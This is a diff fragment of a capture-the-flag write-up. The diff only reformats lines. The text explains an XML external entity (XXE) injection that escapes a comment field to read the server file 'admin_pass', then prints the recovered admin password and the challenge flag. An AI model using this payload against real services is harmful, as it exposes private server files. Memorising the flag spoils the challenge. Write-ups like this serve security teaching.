@@ -83,13 +83,14 @@ And `version` to:
 --><!DOCTYPE d [<!ENTITY xxe SYSTEM \"file:///admin_pass\">]><!--
 ```
 
-First we close the comment from the version with `-->` we insert our DOCTYPE with the entity and then resume the comment that will be closed by the server with `<!--`
-
+First we close the comment from the version with `-->` we insert our DOCTYPE with the entity and then resume the comment that will be closed by the server with `<!--` \
 This will give us `admin_pass` in the username location:
+
 ![Image Error](assets/xxe.png)
 
 Admin Password is `gLTAqe12Z3OufWG7`
 Putting the password in the admin panel will send us this png:
+
 ![Image Error](assets/flag.png)
 
 Flag: `hexCTF{th3_c00ki3_m0nst3r_at3_my_c00ki3s}`
